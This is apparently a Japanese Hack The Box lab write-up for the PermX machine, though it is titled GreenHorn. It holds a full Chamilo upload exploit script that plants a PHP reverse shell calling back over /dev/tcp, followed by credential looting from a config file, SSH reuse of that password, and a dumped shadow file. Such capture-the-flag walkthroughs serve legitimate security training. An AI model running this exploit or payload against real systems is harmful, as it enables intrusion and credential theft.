# GreenHorn

## 初期偵察
### nmap
```
┌──(kali㉿kali)-[~/htb/Retired_Machines]
└─$ nmap -sC -sV 10.10.11.23 -Pn    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 01:45 JST
Nmap scan report for 10.10.11.23
Host is up (0.46s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.95 seconds
```

port80が空いているのでアクセスしてみる


### 名前解決
```
└─$ echo "10.10.11.23 permx.htb" | sudo tee -a /etc/hosts 
[sudo] password for kali: 
10.10.11.23 permx.htb
```

permx.htbにアクセス
![](image.png)


```
┌──(kali㉿kali)-[~/htb/Retired_Machines]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -c -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 927ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 385ms]
:: Progress: [4989/4989] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:37] :: Errors: 0 ::
```
lmsというsubdomain見つけた
### 名前解決追加
```
echo "10.10.11.23 lms.permx.htb" | sudo tee -a /etc/hosts
```
http://lms.permx.htbにアクセスすると

![](image-1.png)


Chamilo 1.11

検索するとeラーニング向けCMSに複数の脆弱性
https://www.security-next.com/151526


## 初期侵入

リバースシェル確立
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.23] 35394
bash: cannot set terminal process group (1173): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

元のターミナル
```
┌──(kali㉿kali)-[~/htb/Retired_Machines]
└─$ cat exploit2.sh                                                            
#!/bin/bash

# ターゲットのURL
HOST='http://lms.permx.htb' 

# 攻撃者のマシン (HTBのVPN接続時は tun0 のIP)
LHOST='10.10.14.33'
LPORT=4444

# アップロード先
URL_UPLD='main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
URL_FILE='main/inc/lib/javascript/bigupload/files/rce.php'

# リバースシェルペイロード作成
cat <<EOF >/tmp/rce.php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'");
?>
EOF

# ファイルをアップロード
echo "[*] Uploading payload..."
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -F "bigUploadFile=@/tmp/rce.php" "$HOST/$URL_UPLD")

if [ "$RESPONSE" -eq 200 ]; then
    echo "[+] Upload successful! Executing payload..."
else
    echo "[-] Upload failed. HTTP Response: $RESPONSE"
    exit 1
fi

# コマンドをエンコード
ENCODED_CMD=$(echo -n "id" | base64 | tr -d '\n' | python3 -c "import urllib.parse,sys; print(urllib.parse.quote_plus(sys.stdin.read()))")

# リバースシェルを実行
curl "$HOST/$URL_FILE?aoOoy=$ENCODED_CMD"

echo "[*] Check your netcat listener: nc -nvlp $LPORT"
```

```
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ cat /etc/passwd
<inc/lib/javascript/bigupload/files$ cat /etc/passwd                     
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
```

```
<inc/lib/javascript/bigupload/files$ cat /etc/shadow                     
cat: /etc/shadow: Permission denied
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ su root
<lo/main/inc/lib/javascript/bigupload/files$ su root                     
Password: 
su: Authentication failure
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<les$ python3 -c 'import pty;pty.spawn("/bin/bash")'                     
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ ls -la 
<ilo/main/inc/lib/javascript/bigupload/files$ ls -la                     
total 12
drwxr-xr-x 2 www-data www-data 4096 Mar 25 17:13 .
drwxr-xr-x 6 www-data www-data 4096 Jan 20  2024 ..
-rw-r--r-- 1 www-data www-data   75 Mar 25 17:27 rce.php
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ ls -la /home
<in/inc/lib/javascript/bigupload/files$ ls -la /home                     
total 12
drwxr-xr-x  3 root root 4096 Jan 20  2024 .
drwxr-xr-x 18 root root 4096 Jul  1  2024 ..
drwxr-x---  4 mtz  mtz  4096 Jun  6  2024 mtz
```

homeディレクトリに`mtz`を見つけた

### linpeasを使う
home/kaliにインストール
```
──(kali㉿kali)-[~]
└─$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
--2025-03-26 02:35:31--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
Resolving github.com (github.com)... 20.27.177.113
Connecting to github.com (github.com)|20.27.177.113|:443... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh [following]
--2025-03-26 02:35:34--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/linpeas.sh [following]
--2025-03-26 02:35:34--  https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/linpeas.sh
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/ec48ca87-1ec6-4880-85e8-2086d896187d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250325%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250325T173535Z&X-Amz-Expires=300&X-Amz-Signature=5f472acf5cb6dedf6458d4a358119f145aa1d114466523f20a1406dacfe9fcd3&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-03-26 02:35:35--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/ec48ca87-1ec6-4880-85e8-2086d896187d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250325%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250325T173535Z&X-Amz-Expires=300&X-Amz-Signature=5f472acf5cb6dedf6458d4a358119f145aa1d114466523f20a1406dacfe9fcd3&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                     100%[=================================================>] 820.39K   750KB/s    in 1.1s    

2025-03-26 02:35:40 (750 KB/s) - ‘linpeas.sh’ saved [840082/840082]

                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ chmod +x linpeas.sh
                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.23 - - [26/Mar/2025 02:36:57] "GET /linpeas.sh HTTP/1.1" 200 -
```
もう一方のターミナル
```
ww-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ cd /tmp
<lo/main/inc/lib/javascript/bigupload/files$ cd /tmp                     
www-data@permx:/tmp$ wget http://10.10.14.33:8080/linpeas.sh -O linpeas.sh
wget http://10.10.14.33:8080/linpeas.sh -O linpeas.sh
--2025-03-25 17:36:56--  http://10.10.14.33:8080/linpeas.sh
Connecting to 10.10.14.33:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 820.39K   166KB/s    in 5.6s    

2025-03-25 17:37:02 (146 KB/s) - ‘linpeas.sh’ saved [840082/840082]

www-data@permx:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@permx:/tmp$ ./linpeas.sh | tee linpeas.log
./linpeas.sh | tee linpeas.log

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                  
    |---------------------------------------------------------------------------------|                                  
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz          |                                 
    |         Follow on Twitter         :     @hacktricks_live                        |                                  
    |         Respect on HTB            :     SirBroccoli                             |                                  
    |---------------------------------------------------------------------------------|                                  
    |                                 Thank you!                                      |                                  
    \---------------------------------------------------------------------------------/                                  
          LinPEAS-ng by carlospolop                                                    
```
得られたもの
```
╔══════════╣ Searching passwords in config PHP files
/var/www/chamilo/app/config/configuration.php:                'show_password_field' => false,                            
/var/www/chamilo/app/config/configuration.php:                'show_password_field' => true,
/var/www/chamilo/app/config/configuration.php:        'wget_password' => '',
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/fwupd/pki/secret.key
/var/lib/pam/password
/var/www/chamilo/custompages/lostpassword-dist.php
/var/www/chamilo/main/auth/set_temp_password.php
/var/www/chamilo/main/cron/user_import/resend_email_with_new_password.php
/var/www/chamilo/main/inc/lib/javascript/password-checker
/var/www/chamilo/main/inc/lib/javascript/password-checker/password-checker.js
/var/www/chamilo/main/inc/lib/pear/HTML/QuickForm/password.php
/var/www/chamilo/main/template/default/custompage/lostpassword.tpl
/var/www/chamilo/main/template/default/mail/reset_password.tpl
/var/www/chamilo/plugin/clockworksms/sms_templates/account_created_updated_login_password.tpl
/var/www/chamilo/plugin/clockworksms/sms_templates/password_updated_login_password.tpl
```


`cat /var/www/chamilo/app/config/configuration.php`中身確認する
```
www-data@permx:/tmp$ cat /var/www/chamilo/app/config/configuration.php
cat /var/www/chamilo/app/config/configuration.php
<?php
// Chamilo version 1.11.24
// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000
/* For licensing terms, see /license.txt */
/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */

// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```
見つけたもの
```
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

### SSHログイン
`mtx`:`03F6lY3uXAP2bkW8`
```
www-data@permx:/tmp$ ssh mtz@10.10.11.23
ssh mtz@10.10.11.23
The authenticity of host '10.10.11.23 (10.10.11.23)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Could not create directory '/var/www/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
mtz@10.10.11.23's password: 03F6lY3uXAP2bkW8

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Mar 25 05:59:11 PM UTC 2025

  System load:           0.11
  Usage of /:            59.0% of 7.19GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             241
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.23
  IPv6 address for eth0: dead:beef::250:56ff:feb0:b300


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
```

### user.txt
```
mtz@permx:~$ cat user.txt
cat user.txt
68cef58ec67838e6b2e530838eeed25c
```


## 権限昇格

```
mtz@permx:~$ sudo -l
sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

```
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/passwd_link
sudo /opt/acl.sh mtz rw /home/mtz/passwd_link
Target must be a file.
mtz@permx:~$ getfacl /etc/passwd
getfacl /etc/passwd
getfacl: Removing leading '/' from absolute path names
# file: etc/passwd
# owner: root
# group: root
user::rw-
group::r--
other::r--
```


```
oot:$y$j9T$VEMcaSLaOOvSE3mYgRXRv/$tNXYdTRyCAkwoSHhlyIoCS91clvPEp/hh0r4NTBlmS7:19742:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
sync:*:19579:0:99999:7:::
games:*:19579:0:99999:7:::
man:*:19579:0:99999:7:::
lp:*:19579:0:99999:7:::
mail:*:19579:0:99999:7:::
news:*:19579:0:99999:7:::
uucp:*:19579:0:99999:7:::
proxy:*:19579:0:99999:7:::
www-data:*:19579:0:99999:7:::
backup:*:19579:0:99999:7:::
list:*:19579:0:99999:7:::
irc:*:19579:0:99999:7:::
gnats:*:19579:0:99999:7:::
nobody:*:19579:0:99999:7:::
_apt:*:19579:0:99999:7:::
systemd-network:*:19579:0:99999:7:::
systemd-resolve:*:19579:0:99999:7:::
messagebus:*:19579:0:99999:7:::
systemd-timesync:*:19579:0:99999:7:::
pollinate:*:19579:0:99999:7:::
sshd:*:19579:0:99999:7:::
syslog:*:19579:0:99999:7:::
uuidd:*:19579:0:99999:7:::
tcpdump:*:19579:0:99999:7:::
tss:*:19579:0:99999:7:::
landscape:*:19579:0:99999:7:::
fwupd-refresh:*:19579:0:99999:7:::
usbmux:*:19742:0:99999:7:::
mtz:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999:7:::
lxd:!:19742::::::
mysql:!:19742:0:99999:7:::
```

